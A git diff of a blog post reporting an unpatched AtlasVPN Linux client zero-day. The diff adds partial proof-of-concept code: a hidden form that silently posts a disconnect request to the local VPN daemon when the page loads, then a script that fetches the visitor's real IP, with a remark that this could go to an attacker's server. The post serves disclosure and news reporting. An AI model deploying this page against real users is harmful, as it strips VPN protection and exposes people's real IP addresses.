@@ -1,5 +1,5 @@
 ---
-title: Unpached Atlas VPN 0Day PoC Posted 
+title: Unpached AtlasVPN Zero Day - Proof of Concept
 date: 2023-09-03 12:00:00 +0800
 categories: [VPN]
 tags: [atlas vpn, privacy, exploit]     # TAG names should always be lowercase
@@ -19,7 +19,43 @@ According to EM8, the AtlasVPN runs both a client and a daemon, and the client c
 
 # Breakdown of Script (Very Complex Steps) 
 1. Send a command to stop the VPN 
-2. Grap Real IP address
+```
+</code></pre>
+   <iframe id="hiddenFrame" name="hiddenFrame" style="display: none;"></iframe>
+  <form id="stopForm" action="http://127.0.0.1:8076/connection/stop" method="post" target="hiddenFrame">
+    <button type="submit" style="display: none"></button>
+  </form>
+   <script>
+    window._currentIP = false;
+     // Run main exploit code
+    window.addEventListener('load', function () {
+      addIPToLog();
+      setTimeout(triggerFormSubmission, 1000);
+      setTimeout(addIPToLog, 3000);
+    });
+     // Blind CORS request to atlasvpnd to disconnect the VPN
+    function triggerFormSubmission() {
+      var logDiv = document.getElementById('log');
+      logDiv.innerHTML += "[-] Sending disconnect request to atlasvpnd...\n";
+      document.getElementById('stopForm').submit();
+```
+2. Grab Real IP address
+   
+```
+     // Gets IP from ipfy API (this, of course, could be your server)
+    function addIPToLog() {
+      var logDiv = document.getElementById('log');
+      var xhr = new XMLHttpRequest();
+       xhr.open('GET', 'https://api.ipify.org?format=json', true);
+       xhr.onload = function () {
+        var ipAddress = window._currentIP;
+        if (xhr.status === 200) {
+          var response = JSON.parse(xhr.responseText);
+          ipAddress = response.ip;
+           logDiv.innerHTML += '[?] Current IP:' + ipAddress + "\n";
+```
+> The Reddit poster has the code in [full](https://www.reddit.com/r/cybersecurity/comments/167f16e/atlasvpn_linux_client_103_remote_disconnect/).
+{: .prompt-info }
 
 # Confirmation 
 In a post from Chris Partridge on Mastodon, he called the “hilarious[ly]” bad security “utter garbage”.[^footnote7]  Also included with the exposé was a video which appears to demonstrate the Proof of Concept for the dropped connection, as well as the explination that since it makes "simple request" this allows it to slip past Cross-Origin Resource Sharing ([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)). 
